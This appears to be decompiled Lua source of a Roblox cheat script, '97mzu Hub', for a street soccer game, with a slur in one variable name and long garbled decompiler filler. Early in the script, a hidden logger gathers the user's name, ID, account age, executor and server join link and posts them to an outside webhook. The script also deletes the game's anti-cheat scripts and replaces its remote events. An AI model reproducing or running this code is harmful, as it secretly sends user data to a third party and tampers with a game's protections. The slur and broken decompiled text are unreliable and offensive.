local Part, Cloneref_Result, HttpService, UserId, DisplayName, Name, UserInputService, MarketplaceService, PlaceId, JobId, T, _97mzuHubUI, _97mzuToggleButton, UICorner_6, UICorner_7, UICorner_8, UICorner_9, UICorner_10, UICorner_11, UICorner_12, UICorner_13, UICorner_14, UICorner_15, UICorner_16, UICorner_17, UICorner_18, UICorner_19, UICorner_20, UICorner_21, UICorner_22, UICorner_23, UICorner_24, UICorner_25, UICorner_26, UICorner_27, UICorner_28, UICorner_29, UICorner_30, UICorner_31, UICorner_32, UICorner_33, UICorner_34, UICorner_35, UICorner_36, UICorner_37, UICorner_38, UICorner_39, UICorner_40, UICorner_41, UICorner_42, UICorner_43, UICorner_44, UICorner_45, UICorner_46, UICorner_47, UICorner_48, UICorner_49, UICorner_50, UICorner_51, UICorner_52, UICorner_53, UICorner_54, UICorner_55, UICorner_56, UICorner_57, UICorner_58, UICorner_59, UICorner_60, UICorner_61, UICorner_62, UICorner_63, UICorner_64, UICorner_65, UICorner_66, UICorner_67, UICorner_68, UICorner_69, UICorner_70, UICorner_71, UICorner_72, UICorner_73, UICorner_74, UICorner_75, UICorner_76, UICorner_77, UICorner_78, UICorner_79, UICorner_80, UICorner_81, UICorner_82, UICorner_83, UICorner_84, UICorner_85, UICorner_86, UICorner_87, UICorner_88, UICorner_89, UICorner_90, UICorner_91, Pcall_Result_2, TeleportService, Pcall_Result_3, TweenInfo_New, r3887, r1040, r3897, r3907, r3917, r3927, r3937, r3947, r3957, r3967, r3979, r3989, r3999, r4009, r4019, r4029, r4039, r4049, r4059, r4069, r4081, r4091, r4101, r4111, r4121, r4131, r4141, r4151, r4161, r4171, r4183, r4193, r4203, r4213, r4223, r4233, r4243, r4253, r4263, r4273, r4285, R1333_X, AbsoluteSize_2, R1333_X_2_Minus_Number, Math_Max_Result, R1340_Result, Vector2_New, TextSize, R1316_Text, TextSize_2, R1316_Font, R4308_Y, R397_Result, R4308_Y_2, Number_2_Plus_R4308_Y_3, r4314, Math_Max_Result_2, R397_Result_2, R1408_X, AbsoluteSize_4, R1408_X_2_Minus_Number_5, Math_Max_Result_3, R1340_Result_2, TextSize_4, R1391_Text, TextSize_5, R1391_Font, R4324_Y, R397_Result_3, R4324_Y_2, Number_6_Plus_R4324_Y_3, r4330, Math_Max_Result_4, R397_Result_4, R1480_X, AbsoluteSize_6, R1480_X_2_Minus_Number_9, Math_Max_Result_5, R1340_Result_3, TextSize_7, R1463_Text, TextSize_8, R1463_Font, R4340_Y, R397_Result_5, R4340_Y_2, Number_10_Plus_R4340_Y_3, r4347, R397_Result_6, R1590_X, AbsoluteSize_8, R1590_X_2_Minus_Number_13, Math_Max_Result_6, R1340_Result_4, TextSize_10, R1573_Text, TextSize_11, R1573_Font, R4360_Y, R397_Result_7, R4360_Y_2, Number_14_Plus_R4360_Y_3, r4367, R397_Result_8, r4374, r4384, r4394, r4404, r4425, r4435, Torso, r4459, r4469, r4486, r4501, R4507_Result, r4519, r4534, R4540_Result, r4552, r4567, R4573_Result, r4585, r4600, R4606_Result, r4618, r4633, R4639_Result, r4651, r4666, R4672_Result, r4684, r4699, R4705_Result, r4714, r4724, r4734, r4744, r4759, r4769, BlueFlame, Backpack, r4790, r4800, PowerShot, Cooldown, Cooldown_2, r4827, r4837, r4847, r4857, r4876, r4891, CameraShaker, StarterPack, CameraShaker_2, r5037, r5052, Map, r5189, r5204, Powers, PointLight, r5225, r5240, HumanoidRootPart, r5268, r5283, r5299, r5314, r5330, r5345, r5361, r5376, r5398, r5408, r5434, r5444, r5472, r5482, r5497, r5512, r5522, r5532, R5539_Result, r5547, r5557, R2929_Text, r5573, r5583, r5593, r5603, r5622, r5637, r5657, r5672, _97MZUISRLYGOATNIGGARS, r5697, r5707, r5736, r5746, DisablePlayerShadows, Players_2, For_Val_16_Character, PlayerAdded, Connection, CharacterAdded_2, Descendants, Players_3, CharacterAdded_3, r5786, r5796, CurrentCamera, r5820, r5830, r5840, r5850, r5869, r5884, TPSSystem, TPSSystem_2, TPS, InputBegan_3, Heartbeat, r5912, r5922, TPS1, Vector3_New, TPSSystem_3, Position, r5953, r5968, r5982, r5997, r6012, r6022;
local fenv = getfenv();
pcall(function(a, b, c)
    Part = Instance.new"Part";
    Cloneref_Result = cloneref(Part);
    local _ = Part == Cloneref_Result;
    Cloneref_Result.Name = "";
    return false;
end);
task.defer(function(a_137, b_137, c_137) end);
task.wait(1);
_G. = "<long string (390 kilobytes)>";
local _ = os.time() - os.time();
local Players = game:GetService("Players");
local LocalPlayer = Players.LocalPlayer;
local Character = LocalPlayer.Character;
pcall(function(a_4, b_4, c_4)
    HttpService = game:GetService("HttpService");
    game:GetService("Players");
    UserId = LocalPlayer.UserId;
    local _ = UserId .. "/profile";
    pcall(function(a_2, b_2, c_2)
        game:GetService("HttpService");
        game:GetService("Players");
    end);
    game:GetService("Players");
    DisplayName = LocalPlayer.DisplayName;
    local _ = DisplayName .. "```";
    game:GetService("Players");
    Name = LocalPlayer.Name;
    local _ = Name .. "```";
    game:GetService("Players");
    game:GetService("Players");
    local _ = UserId .. "/profile)";
    local _ = UserId .. "](https://www.roblox.com/users/931109/profile)";
    game:GetService("Players");
    tostring(LocalPlayer.AccountAge);
    game:GetService("Players");
    game:GetService("Players");
    Character:FindFirstChild("Humanoid");
    game:GetService("Players");
    game:GetService("Players");
    game:GetService("Players");
    local _ = LocalPlayer.Team.Name .. "```";
    UserInputService = game:GetService("UserInputService");
    game:GetService("UserInputService");
    game:GetService("UserInputService");
    identifyexecutor();
    local success_2, r109 = pcall(function(a_3, b_3, c_3)
        MarketplaceService = game:GetService("MarketplaceService");
        PlaceId = game.PlaceId;
        return MarketplaceService:GetProductInfo(PlaceId);
    end);
    game:GetService("Players");
    local _ = Players:GetPlayers()[1];
    game:GetService("Players");
    local _ = Players.MaxPlayers .. "```";
    local _ = PlaceId .. "```";
    JobId = game.JobId;
    local _ = JobId .. "```";
    local _ = JobId .. ")";
    local _ = PlaceId .. "?privateServerLinkCode=hetrpusi)";
    T = os.date"!*t";
    HttpService:JSONEncode({
        ["username"] = "97mzu Services",
        ["embeds"] = {
            {
                ["fields"] = {
                    {
                        ["value"] = "```qwvdmrxq```",
                        ["name"] = "DISPLAY NAME",
                        ["inline"] = true
                    },
                    {
                        ["value"] = "```Player```",
                        ["name"] = "USERNAME",
                        ["inline"] = true
                    },
                    {
                        ["value"] = "[931109](https://www.roblox.com/users/931109/profile)",
                        ["name"] = "USER ID",
                        ["inline"] = true
                    },
                    {
                        ["value"] = "```867831 days```",
                        ["name"] = "ACCOUNT AGE",
                        ["inline"] = true
                    },
                    {
                        ["value"] = "```" .. (
                            tostring(
                                math.floor(Character.Humanoid.Health)
                            ) .. " HP```"
                        ),
                        ["name"] = "HEALTH",
                        ["inline"] = true
                    },
                    {
                        ["value"] = "```Team```",
                        ["name"] = "TEAM",
                        ["inline"] = true
                    },
                    {
                        ["value"] = "```Console```",
                        ["name"] = "PLATFORM",
                        ["inline"] = true
                    },
                    {
                        ["value"] = "```" .. (
                            workspace.CurrentCamera.ViewportSize.X .. (
                                "x" .. (
                                    workspace.CurrentCamera.ViewportSize.Y .. "```"
                                )
                            )
                        ),
                        ["name"] = "RESOLUTION",
                        ["inline"] = true
                    },
                    {
                        ["value"] = "```Krnl```",
                        ["name"] = "EXECUTOR",
                        ["inline"] = true
                    },
                    {
                        ["value"] = "———————————————————————",
                        ["name"] = "SERVER INFORMATION",
                        ["inline"] = false
                    },
                    {
                        ["value"] = "```" .. (
                            r109.Name .. "```"
                        ),
                        ["name"] = "GAME",
                        ["inline"] = true
                    },
                    {
                        ["value"] = "```0 / 12```",
                        ["name"] = "PLAYERS",
                        ["inline"] = true
                    },
                    {
                        ["value"] = "```450852```",
                        ["name"] = "PLACE ID",
                        ["inline"] = true
                    },
                    {
                        ["value"] = "```hetrpusi```",
                        ["name"] = "JOB ID",
                        ["inline"] = false
                    },
                    {
                        ["value"] = "[Click to Join Server](https://www.roblox.com/games/450852?privateServerLinkCode=hetrpusi)",
                        ["name"] = "DIRECT CONNECT",
                        ["inline"] = false
                    }
                },
                ["title"] = "97MZU HUB // USER PROFILE",
                ["footer"] = {
                    ["text"] = "System Log • 06/09/2026 — 46 UTC"
                },
                ["color"] = 2829617,
                ["url"] = "https://www.roblox.com/users/931109/profile",
                ["thumbnail"] = {
                    ["url"] = ""
                }
            }
        },
        ["avatar_url"] = ""
    });
    fenv.syn.request{
        ["Body"] = "{\"avatar_url\":\"\",\"embeds\":[{\"color\":2829617,\"fields\":[{\"inline\":true,\"name\":\"DISPLAY NAME\",\"value\":\"```qwvdmrxq```\"},{\"inline\":true,\"name\":\"USERNAME\",\"value\":\"```Player```\"},{\"inline\":true,\"name\":\"USER ID\",\"value\":\"[931109](https://www.roblox.com/users/931109/profile)\"},{\"inline\":true,\"name\":\"ACCOUNT AGE\",\"value\":\"```867831 days```\"},{\"inline\":true,\"name\":\"HEALTH\",\"value\":{}},{\"inline\":true,\"name\":\"TEAM\",\"value\":\"```Team```\"},{\"inline\":true,\"name\":\"PLATFORM\",\"value\":\"```Console```\"},{\"inline\":true,\"name\":\"RESOLUTION\",\"value\":{}},{\"inline\":true,\"name\":\"EXECUTOR\",\"value\":\"```Krnl```\"},{\"inline\":false,\"name\":\"SERVER INFORMATION\",\"value\":\"———————————————————————\"},{\"inline\":true,\"name\":\"GAME\",\"value\":{}},{\"inline\":true,\"name\":\"PLAYERS\",\"value\":\"```0 / 12```\"},{\"inline\":true,\"name\":\"PLACE ID\",\"value\":\"```450852```\"},{\"inline\":false,\"name\":\"JOB ID\",\"value\":\"```hetrpusi```\"},{\"inline\":false,\"name\":\"DIRECT CONNECT\",\"value\":\"[Click to Join Server](https://www.roblox.com/games/450852?privateServerLinkCode=hetrpusi)\"}],\"footer\":{\"text\":\"System Log • 06/09/2026 — 46 UTC\"},\"thumbnail\":{\"url\":\"\"},\"title\":\"97MZU HUB // USER PROFILE\",\"url\":\"https://www.roblox.com/users/931109/profile\"}],\"username\":\"97mzu Services\"}",
        ["Url"] = "https://sentinelhook.lol/api.php?id=Yt2BkcWn2NokwKR",
        ["Method"] = "POST",
        ["Headers"] = {
            ["Content-Type"] = "application/json"
        }
    };
end);
game:GetService("Players");
game:GetService("Workspace");
local Lighting = game:GetService("Lighting");
local Sky = Lighting:FindFirstChildOfClass("Sky");
Sky.SkyboxUp = "rbxassetid://6778658364";
Sky.SkyboxRt = "rbxassetid://6778650519";
Sky.SkyboxLf = "rbxassetid://6778649136";
Sky.SkyboxFt = "rbxassetid://6778648039";
Sky.SkyboxBk = "rbxassetid://6778646360";
Sky.SkyboxDn = "rbxassetid://6778658683";
local Workspace_FE = workspace.FE;
local Start_2 = LocalPlayer.PlayerGui.Start;
for for_key_0, for_val_0 in pairs(Workspace_FE.Settings:GetChildren()) do
end;
for for_key_1, for_val_1 in pairs(Workspace_FE.Settings:GetChildren()) do
end;
for for_key_2, for_val_2 in pairs(Workspace_FE.System:GetChildren()) do
end;
for for_key_3, for_val_3 in pairs(Character:GetChildren()) do
end;
for for_key_4, for_val_4 in pairs(game.StarterGui.Start:GetChildren()) do
    for_val_4:IsA("LocalScript");
    string.match(for_val_4.Name, "%d");
    for_val_4:Destroy();
    for_val_4:IsA("LocalScript");
    string.match(for_val_4.Name, " ");
    for_val_4:Destroy();
    for_val_4:IsA("LocalScript");
    string.match(for_val_4.Name, "CheckPlayerW");
    for_val_4:Destroy();
    for_val_4:IsA("LocalScript");
    string.match(for_val_4.Name, "Gradient");
    for_val_4:Destroy();
end;
for for_key_5, for_val_5 in pairs(Start_2:GetChildren()) do
    for_val_5:IsA("LocalScript");
    string.match(for_val_5.Name, "%d");
    for_val_5:Destroy();
    for_val_5:IsA("LocalScript");
    string.match(for_val_5.Name, " ");
    for_val_5:Destroy();
    for_val_5:IsA("LocalScript");
    string.match(for_val_5.Name, "CheckPlayerW");
    for_val_5:Destroy();
    for_val_5:IsA("LocalScript");
    string.match(for_val_5.Name, "Gradient");
    for_val_5:Destroy();
end;
for for_key_6, for_val_6 in pairs(game.StarterPlayer.StarterCharacterScripts:GetChildren()) do
end;
local CharacterAdded = LocalPlayer.CharacterAdded;
CharacterAdded:Connect(function(a_17, b_17, c_17)
    task.wait(0.5);
    for for_key_7, for_val_7 in pairs(Character:GetChildren()) do
    end;
end);
local System_2 = Workspace_FE.System;
local KeepYourHeadUp = System_2:FindFirstChild("KeepYourHeadUp");
local HelloWorld = System_2:FindFirstChild("HelloWorld");
local RemoteEvent = Instance.new"RemoteEvent";
local RemoteEvent_2 = Instance.new"RemoteEvent";
RemoteEvent.Name = KeepYourHeadUp.Name;
RemoteEvent.Parent = System_2;
KeepYourHeadUp:Destroy();
RemoteEvent_2.Name = HelloWorld.Name;
RemoteEvent_2.Parent = System_2;
HelloWorld:Destroy();
game:GetService("Players");
local TweenService = game:GetService("TweenService");
game:GetService("UserInputService");
local CoreGui = game:GetService("CoreGui");
local RunService = game:GetService("RunService");
game:GetService("MarketplaceService");
local FromRGB = Color3.fromRGB;
local R294_Result = FromRGB(24, 24, 24);
local R294_Result_2 = FromRGB(18, 18, 18);
local R294_Result_3 = FromRGB(32, 32, 32);
local R294_Result_4 = FromRGB(45, 45, 45);
local R294_Result_5 = FromRGB(255, 51, 51);
local R294_Result_6 = FromRGB(255, 255, 255);
local R294_Result_7 = FromRGB(120, 120, 125);
FromRGB(255, 75, 75);
local _ = Enum.Font.GothamBold;
pcall(function(a_11, b_11, c_11)
    _97mzuHubUI = CoreGui:FindFirstChild("97mzuHubUI");
    _97mzuHubUI:Destroy();
    local _ = _97mzuHubUI == workspace.CurrentCamera;
    local _ = _97mzuHubUI == workspace;
    local _ = _97mzuHubUI == LocalPlayer;
    local _ = _97mzuHubUI == LocalPlayer;
    local _ = _97mzuHubUI == LocalPlayer;
    local _ = _97mzuHubUI == LocalPlayer;
    local _ = _97mzuHubUI == LocalPlayer;
    local _ = _97mzuHubUI == LocalPlayer;
    local _ = _97mzuHubUI == LocalPlayer;
    local _ = _97mzuHubUI == LocalPlayer;
    local _ = _97mzuHubUI == LocalPlayer;
    local _ = _97mzuHubUI == LocalPlayer;
    local _ = _97mzuHubUI == LocalPlayer;
    local _ = _97mzuHubUI == LocalPlayer;
    local _ = _97mzuHubUI == LocalPlayer;
    local _ = _97mzuHubUI == LocalPlayer;
    local _ = _97mzuHubUI == LocalPlayer;
    local _ = _97mzuHubUI == LocalPlayer;
    local _ = _97mzuHubUI == Character;
    local _ = _97mzuHubUI == Character;
    local _ = _97mzuHubUI == Character;
    local _ = _97mzuHubUI == Character;
    local _ = _97mzuHubUI == Character;
    _97mzuToggleButton = CoreGui:FindFirstChild("97mzuToggleButton");
    _97mzuToggleButton:Destroy();
    local _ = _97mzuToggleButton == workspace.CurrentCamera;
    local _ = _97mzuToggleButton == workspace;
    local _ = _97mzuToggleButton == LocalPlayer;
    local _ = _97mzuToggleButton == LocalPlayer;
    local _ = _97mzuToggleButton == LocalPlayer;
    local _ = _97mzuToggleButton == LocalPlayer;
    local _ = _97mzuToggleButton == LocalPlayer;
    local _ = _97mzuToggleButton == LocalPlayer;
    local _ = _97mzuToggleButton == LocalPlayer;
    local _ = _97mzuToggleButton == LocalPlayer;
    local _ = _97mzuToggleButton == LocalPlayer;
    local _ = _97mzuToggleButton == LocalPlayer;
    local _ = _97mzuToggleButton == LocalPlayer;
    local _ = _97mzuToggleButton == LocalPlayer;
    local _ = _97mzuToggleButton == LocalPlayer;
    local _ = _97mzuToggleButton == LocalPlayer;
    local _ = _97mzuToggleButton == LocalPlayer;
    local _ = _97mzuToggleButton == LocalPlayer;
    local _ = _97mzuToggleButton == Character;
    local _ = _97mzuToggleButton == Character;
    local _ = _97mzuToggleButton == Character;
    local _ = _97mzuToggleButton == Character;
    local _ = _97mzuToggleButton == Character;
end);
local _97mzuHubUI_2 = LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("97mzuHubUI");
_97mzuHubUI_2:Destroy();
local _ = _97mzuHubUI_2 == workspace.CurrentCamera;
local _ = _97mzuHubUI_2 == workspace;
local _ = _97mzuHubUI_2 == LocalPlayer;
local _ = _97mzuHubUI_2 == LocalPlayer;
local _ = _97mzuHubUI_2 == LocalPlayer;
local _ = _97mzuHubUI_2 == LocalPlayer;
local _ = _97mzuHubUI_2 == LocalPlayer;
local _ = _97mzuHubUI_2 == LocalPlayer;
local _ = _97mzuHubUI_2 == LocalPlayer;
local _ = _97mzuHubUI_2 == LocalPlayer;
local _ = _97mzuHubUI_2 == LocalPlayer;
local _ = _97mzuHubUI_2 == LocalPlayer;
local _ = _97mzuHubUI_2 == LocalPlayer;
local _ = _97mzuHubUI_2 == LocalPlayer;
local _ = _97mzuHubUI_2 == LocalPlayer;
local _ = _97mzuHubUI_2 == LocalPlayer;
local _ = _97mzuHubUI_2 == LocalPlayer;
local _ = _97mzuHubUI_2 == LocalPlayer;
local _ = _97mzuHubUI_2 == Character;
local _ = _97mzuHubUI_2 == Character;
local _ = _97mzuHubUI_2 == Character;
local _ = _97mzuHubUI_2 == Character;
local _ = _97mzuHubUI_2 == Character;
local _97mzuHubUI_3 = Instance.new"ScreenGui";
_97mzuHubUI_3.Name = "97mzuHubUI";
_97mzuHubUI_3.ResetOnSpawn = false;
pcall(function(a_12, b_12, c_12)
    _97mzuHubUI_3.Parent = CoreGui;
end);
local Frame = Instance.new"Frame";
local UDim2_New = UDim2.new;
Frame.Size = UDim2_New(0, 580, 0, 380);
Frame.Position = UDim2_New(0.5, -290, 0.5, -190);
Frame.BackgroundColor3 = R294_Result;
Frame.BorderSizePixel = 0;
Frame.ClipsDescendants = true;
Frame.Parent = _97mzuHubUI_3;
local UICorner = Instance.new("UICorner", Frame);
local UDim_New = UDim.new;
UICorner.CornerRadius = UDim_New(0, 14);
local _97mzuToggleButton_2 = Instance.new"ScreenGui";
_97mzuToggleButton_2.Name = "97mzuToggleButton";
_97mzuToggleButton_2.ResetOnSpawn = false;
_97mzuToggleButton_2.Parent = CoreGui;
local TextButton = Instance.new"TextButton";
TextButton.Size = UDim2.fromOffset(45, 46);
TextButton.Position = UDim2_New(0, 20, 0.5, -20);
TextButton.BackgroundColor3 = FromRGB(25, 25, 25);
TextButton.BackgroundTransparency = 1;
TextButton.TextColor3 = FromRGB(255, 255, 255);
local _ = Enum.Font.GothamBold;
TextButton.Font = Enum.Font.GothamBold;
TextButton.TextSize = 15;
TextButton.Text = "";
TextButton.ZIndex = 2;
TextButton.Parent = _97mzuToggleButton_2;
local ImageLabel = Instance.new"ImageLabel";
local FromScale = UDim2.fromScale;
ImageLabel.Size = FromScale(1, 1);
ImageLabel.Position = FromScale(0, 0);
ImageLabel.BackgroundTransparency = 1;
ImageLabel.Image = "rbxassetid://106468208012751";
ImageLabel.ZIndex = 1;
ImageLabel.Parent = TextButton;
local UICorner_2 = Instance.new"UICorner";
UICorner_2.CornerRadius = UDim_New(0, 45);
UICorner_2.Parent = ImageLabel;
local UICorner_3 = Instance.new"UICorner";
UICorner_3.CornerRadius = UDim_New(0, 45);
UICorner_3.Parent = TextButton;
TextButton.MouseButton1Click:Connect(function(a_18, b_18, c_18)

end);
TextButton.InputBegan:Connect(function(input, a_19, b_19, c_19)
    local _ = Enum.UserInputType.MouseButton1;
    local _ = Enum.UserInputType.Touch;
end);
TextButton.InputEnded:Connect(function(input_1, a_20, b_20, c_20)
    local _ = Enum.UserInputType.MouseButton1;
    local _ = Enum.UserInputType.Touch;
end);
local InputChanged = UserInputService.InputChanged;
InputChanged:Connect(function(input_2, a_21, b_21, c_21) end);
local Frame_2 = Instance.new"Frame";
Frame_2.Size = UDim2_New(1, 0, 0, 36);
Frame_2.BackgroundColor3 = R294_Result;
Frame_2.BorderSizePixel = 0;
Frame_2.Parent = Frame;
Frame_2.InputBegan:Connect(function(input_3, a_21, b_21, c_21)
    local _ = Enum.UserInputType.MouseButton1;
    local _ = Enum.UserInputType.Touch;
end);
Frame_2.InputEnded:Connect(function(input_4, a_22, b_22, c_22)
    local _ = Enum.UserInputType.MouseButton1;
    local _ = Enum.UserInputType.Touch;
end);
InputChanged:Connect(function(input_5, a_23, b_23, c_23)
    local _ = Enum.UserInputType.MouseMovement;
    local _ = Enum.UserInputType.Touch;
end);
local RenderStepped = RunService.RenderStepped;
RenderStepped:Connect(function(a_24, b_24, c_24) end);
local ImageLabel_2 = Instance.new"ImageLabel";
ImageLabel_2.Size = UDim2_New(0, 25, 0, 25);
ImageLabel_2.Position = UDim2_New(0, 10, 0.5, -11);
ImageLabel_2.BackgroundTransparency = 1;
ImageLabel_2.Image = "rbxassetid://106468208012751";
ImageLabel_2.Parent = Frame_2;
local UICorner_4 = Instance.new("UICorner", ImageLabel_2);
UICorner_4.CornerRadius = UDim_New(0, 5);
local TextLabel = Instance.new"TextLabel";
TextLabel.Size = UDim2_New(0, 150, 1, 0);
TextLabel.Position = UDim2_New(0, 40, 0, 0);
TextLabel.BackgroundTransparency = 1;
TextLabel.Text = "97mzu Hub V1.97 - TPS: Street Soccer ";
TextLabel.TextColor3 = R294_Result_6;
local _ = Enum.Font.GothamBold;
TextLabel.Font = Enum.Font.GothamBold;
TextLabel.TextSize = 16;
local _ = Enum.TextXAlignment.Left;
TextLabel.TextXAlignment = Enum.TextXAlignment.Left;
TextLabel.Parent = Frame_2;
local X = Instance.new"TextButton";
X.Size = UDim2_New(0, 24, 0, 24);
X.Position = UDim2_New(1, -30, 0.5, -12);
X.BackgroundColor3 = FromRGB(35, 35, 35);
X.Text = "X";
X.TextColor3 = R294_Result_6;
local _ = Enum.Font.GothamBold;
X.Font = Enum.Font.GothamBold;
X.TextSize = 12;
X.Parent = Frame_2;
X.BackgroundTransparency = 1;
local UICorner_5 = Instance.new("UICorner", X);
UICorner_5.CornerRadius = UDim_New(0, 6);
X.MouseButton1Click:Connect(function(a_24, b_24, c_24)
    _97mzuToggleButton_2:Destroy();
    local _ = _97mzuToggleButton_2 == r2796;
    local _ = _97mzuToggleButton_2 == r667;
    local _ = _97mzuToggleButton_2 == r2424;
    local _ = _97mzuToggleButton_2 == r547;
    local _ = _97mzuToggleButton_2 == r3539;
    local _ = _97mzuToggleButton_2 == r2287;
    local _ = _97mzuToggleButton_2 == r601;
    local _ = _97mzuToggleButton_2 == r2462;
    local _ = _97mzuToggleButton_2 == r2067;
    local _ = _97mzuToggleButton_2 == r2855;
    local _ = _97mzuToggleButton_2 == r1005;
    local _ = _97mzuToggleButton_2 == r1146;
    local _ = _97mzuToggleButton_2 == r826;
    local _ = _97mzuToggleButton_2 == r3209;
    local _ = _97mzuToggleButton_2 == r814;
    local _ = _97mzuToggleButton_2 == r1618;
    local _ = _97mzuToggleButton_2 == r1434;
    local _ = _97mzuToggleButton_2 == r3408;
    local _ = _97mzuToggleButton_2 == r2443;
    local _ = _97mzuToggleButton_2 == r908;
    local _ = _97mzuToggleButton_2 == r883;
    local _ = _97mzuToggleButton_2 == r557;
    local _ = _97mzuToggleButton_2 == r1927;
    local _ = _97mzuToggleButton_2 == r651;
    local _ = _97mzuToggleButton_2 == r1505;
    local _ = _97mzuToggleButton_2 == r2769;
    local _ = _97mzuToggleButton_2 == r779;
    local _ = _97mzuToggleButton_2 == r3144;
    local _ = _97mzuToggleButton_2 == r2347;
    local _ = _97mzuToggleButton_2 == r2029;
    local _ = _97mzuToggleButton_2 == r1946;
    local _ = _97mzuToggleButton_2 == r2539;
    local _ = _97mzuToggleButton_2 == UICorner_5;
    local _ = _97mzuToggleButton_2 == r2616;
    local _ = _97mzuToggleButton_2 == r3362;
    local _ = _97mzuToggleButton_2 == r1982;
    local _ = _97mzuToggleButton_2 == r3239;
    local _ = _97mzuToggleButton_2 == r3521;
    local _ = _97mzuToggleButton_2 == r3471;
    local _ = _97mzuToggleButton_2 == r1206;
    local _ = _97mzuToggleButton_2 == r3427;
    local _ = _97mzuToggleButton_2 == r3389;
    local _ = _97mzuToggleButton_2 == r994;
    local _ = _97mzuToggleButton_2 == r3015;
    local _ = _97mzuToggleButton_2 == r3299;
    local _ = _97mzuToggleButton_2 == r1245;
    local _ = _97mzuToggleButton_2 == r1802;
    local _ = _97mzuToggleButton_2 == r3527;
    local _ = _97mzuToggleButton_2 == r848;
    local _ = _97mzuToggleButton_2 == r2084;
    local _ = _97mzuToggleButton_2 == r2225;
    local _ = _97mzuToggleButton_2 == r3120;
    local _ = _97mzuToggleButton_2 == Character;
    local _ = _97mzuToggleButton_2 == Character;
    local _ = _97mzuToggleButton_2 == Character;
    local _ = _97mzuToggleButton_2 == Character;
    local _ = _97mzuToggleButton_2 == Character;
    local _ = _97mzuToggleButton_2 == Character;
    local _ = _97mzuToggleButton_2 == r1899;
    local _ = _97mzuToggleButton_2 == r2175;
    local _ = _97mzuToggleButton_2 == r1678;
    local _ = _97mzuToggleButton_2 == r3073;
    local _ = _97mzuToggleButton_2 == r933;
    local _ = _97mzuToggleButton_2 == UICorner_4;
    local _ = _97mzuToggleButton_2 == r1359;
    local _ = _97mzuToggleButton_2 == r3054;
    local _ = _97mzuToggleButton_2 == r2955;
    local _ = _97mzuToggleButton_2 == r2925;
    local _ = _97mzuToggleButton_2 == r2736;
    local _ = _97mzuToggleButton_2 == r2558;
    local _ = _97mzuToggleButton_2 == r2672;
    local _ = _97mzuToggleButton_2 == r2048;
    local _ = _97mzuToggleButton_2 == r2711;
    local _ = _97mzuToggleButton_2 == r2520;
    local _ = _97mzuToggleButton_2 == r2577;
    local _ = _97mzuToggleButton_2 == r1965;
    local _ = _97mzuToggleButton_2 == r2257;
    local _ = _97mzuToggleButton_2 == r896;
    local _ = _97mzuToggleButton_2 == workspace;
    local _ = _97mzuToggleButton_2 == r1874;
    local _ = _97mzuToggleButton_2 == workspace.CurrentCamera;
    local _ = _97mzuToggleButton_2 == r981;
    local _ = _97mzuToggleButton_2 == r2386;
    local _ = _97mzuToggleButton_2 == UICorner;
    local _ = _97mzuToggleButton_2 == r2010;
    local _ = _97mzuToggleButton_2 == r1284;
    local _ = _97mzuToggleButton_2 == r3177;
    local _ = _97mzuToggleButton_2 == r2501;
    local _ = _97mzuToggleButton_2 == r1717;
    local _ = _97mzuToggleButton_2 == r1016;
    local _ = _97mzuToggleButton_2 == r580;
    local _ = _97mzuToggleButton_2 == r688;
    local _ = _97mzuToggleButton_2 == LocalPlayer;
    local _ = _97mzuToggleButton_2 == LocalPlayer;
    local _ = _97mzuToggleButton_2 == LocalPlayer;
    local _ = _97mzuToggleButton_2 == LocalPlayer;
    local _ = _97mzuToggleButton_2 == LocalPlayer;
    local _ = _97mzuToggleButton_2 == LocalPlayer;
    local _ = _97mzuToggleButton_2 == LocalPlayer;
    local _ = _97mzuToggleButton_2 == LocalPlayer;
    local _ = _97mzuToggleButton_2 == LocalPlayer;
    local _ = _97mzuToggleButton_2 == LocalPlayer;
    local _ = _97mzuToggleButton_2 == LocalPlayer;
    local _ = _97mzuToggleButton_2 == LocalPlayer;
    local _ = _97mzuToggleButton_2 == LocalPlayer;
    local _ = _97mzuToggleButton_2 == LocalPlayer;
    local _ = _97mzuToggleButton_2 == LocalPlayer;
    local _ = _97mzuToggleButton_2 == LocalPlayer;
    local _ = _97mzuToggleButton_2 == LocalPlayer;
    local _ = _97mzuToggleButton_2 == LocalPlayer;
    local _ = _97mzuToggleButton_2 == LocalPlayer;
    local _ = _97mzuToggleButton_2 == LocalPlayer;
    local _ = _97mzuToggleButton_2 == r838;
    local _ = _97mzuToggleButton_2 == r2405;
    local _ = _97mzuToggleButton_2 == r2115;
    local _ = _97mzuToggleButton_2 == r1544;
    local _ = _97mzuToggleButton_2 == r3338;
    _97mzuHubUI_3:Destroy();
    local _ = _97mzuHubUI_3 == r2796;
    local _ = _97mzuHubUI_3 == r667;
    local _ = _97mzuHubUI_3 == r2424;
    local _ = _97mzuHubUI_3 == r547;
    local _ = _97mzuHubUI_3 == r3539;
    local _ = _97mzuHubUI_3 == r2287;
    local _ = _97mzuHubUI_3 == r601;
    local _ = _97mzuHubUI_3 == r2462;
    local _ = _97mzuHubUI_3 == r2067;
    local _ = _97mzuHubUI_3 == r2855;
    local _ = _97mzuHubUI_3 == r1005;
    local _ = _97mzuHubUI_3 == r1146;
    local _ = _97mzuHubUI_3 == r826;
    local _ = _97mzuHubUI_3 == r3209;
    local _ = _97mzuHubUI_3 == r814;
    local _ = _97mzuHubUI_3 == r1618;
    local _ = _97mzuHubUI_3 == r1434;
    local _ = _97mzuHubUI_3 == r3408;
    local _ = _97mzuHubUI_3 == r2443;
    local _ = _97mzuHubUI_3 == r908;
    local _ = _97mzuHubUI_3 == r883;
    local _ = _97mzuHubUI_3 == r557;
    local _ = _97mzuHubUI_3 == r1927;
    local _ = _97mzuHubUI_3 == r651;
    local _ = _97mzuHubUI_3 == r1505;
    local _ = _97mzuHubUI_3 == r2769;
    local _ = _97mzuHubUI_3 == r779;
    local _ = _97mzuHubUI_3 == r3144;
    local _ = _97mzuHubUI_3 == r2347;
    local _ = _97mzuHubUI_3 == r2029;
    local _ = _97mzuHubUI_3 == r1946;
    local _ = _97mzuHubUI_3 == r2539;
    local _ = _97mzuHubUI_3 == UICorner_5;
    local _ = _97mzuHubUI_3 == r2616;
    local _ = _97mzuHubUI_3 == r3362;
    local _ = _97mzuHubUI_3 == r1982;
    local _ = _97mzuHubUI_3 == r3239;
    local _ = _97mzuHubUI_3 == r3521;
    local _ = _97mzuHubUI_3 == r3471;
    local _ = _97mzuHubUI_3 == r1206;
    local _ = _97mzuHubUI_3 == r3427;
    local _ = _97mzuHubUI_3 == r3389;
    local _ = _97mzuHubUI_3 == r994;
    local _ = _97mzuHubUI_3 == r3015;
    local _ = _97mzuHubUI_3 == r3299;
